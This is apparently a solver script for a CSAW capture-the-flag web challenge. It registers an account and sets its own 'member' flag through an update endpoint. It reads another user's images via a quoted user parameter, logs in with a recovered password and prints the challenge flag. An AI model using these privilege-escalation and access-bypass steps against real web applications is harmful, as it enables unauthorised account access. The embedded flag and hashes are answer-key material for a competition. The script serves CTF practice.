import sys
import requests
import json
from urllib.parse import urljoin
from hashlib import sha256

if len(sys.argv) > 1:
    BASE = sys.argv[1]
else:
    BASE = "http://web.chal.csaw.io:14180/"

IDENTITY_BASE = urljoin(BASE,"identity/")
IMAGES_BASE = urljoin(IDENTITY_BASE,"images")
STATIC_IMAGES = urljoin(BASE,"images")

def register(session, username, password, fname, lname):

    headers = {'Content-type': 'application/json'}
    creds = {"username" : username, "password": password, "first_name":fname, "last_name" : lname}
    response = session.post(urljoin(IDENTITY_BASE, "register"), headers=headers, data=json.dumps(creds))

    print(response)
    print(response.content)

    return session

def login(session, username, password):

    headers = {'Content-type': 'application/json'}
    creds = json.dumps({"username" : username, "password": password})
    response = session.post(urljoin(IDENTITY_BASE, "login"), headers=headers, data=creds)

    print(response)
    print(response.content)

    return session

def account(session):

    response = session.get(urljoin(IDENTITY_BASE, "account"))

    print(response)
    print(response.content)

    return session

def update_member(session):

    headers = {'Content-type': 'application/json'}
    body = json.dumps({"member": True})
    response = session.post(urljoin(IDENTITY_BASE, "update"), headers=headers, data=body)
    print(response)
    print(response.content)

    return session

def verify(session):

    response = session.get(urljoin(IDENTITY_BASE, "verify"))

    print(response)
    print(response.content)

    return session

def images(session, user="otacon@protonmail.com"):
    response = session.get(IMAGES_BASE, params={"user": f'"{user}"'})
    return response.json()['msg']

def main():
    session = requests.session()

    user = "hacked@email.com"
    pw = "pw123"
    fname = "John"
    lname = "Smith"

    session = register(session, user, pw, fname, lname)

    session = login(session, user, pw)

    session = account(session)

    session = update_member(session)

    session = account(session)

    session = verify(session)

    print("Default images:")
    for img in images(session):
        print(img)

    snake = "solidsnake@protonmail.com"
    print(f"Images for {snake}:")
    for img in images(session, snake):
        print(img)

    imgdata = session.get(urljoin(STATIC_IMAGES, img['filename'])).content
    print(f"Image data: {len(imgdata)} bytes, {img['filename']}")
    imgdata_expected_hash = 'f0ff3dcf103dd45e594f429aea6b0aba8c1a924cbc0312e3bea42cc86803a419'
    imgdata_hash = sha256(imgdata).hexdigest()
    assert imgdata_hash == imgdata_expected_hash, f"Image data hash mismatch: {imgdata_hash} != {imgdata_expected_hash} (expected)"

    # Password is in the image but we won't try to OCR :p
    password = "2001_$pace_Odyssey"

    print(f"Logging in as {snake} with password {password}")
    session = login(session, snake, password)

    flag_img_name = session.get(urljoin(IDENTITY_BASE, "get_flag")).json()['msg']
    flag_img = session.get(urljoin(STATIC_IMAGES, flag_img_name)).content
    print(f"Flag image data: {len(flag_img)} bytes, {flag_img_name}")
    flag_img_expected_hash = 'c77ab93e5b0386f1cc581cea4d7e009e6ecdc00fef719152d1cf090d7e5bd360'
    flag_img_hash = sha256(flag_img).hexdigest()
    assert flag_img_hash == flag_img_expected_hash, f"Flag image data hash mismatch: {flag_img_hash} != {flag_img_expected_hash} (expected)"

    print("Flag: csawctf{K3pt_y0u_Wa1t1ng_HUh}")

if __name__=="__main__":
    main()
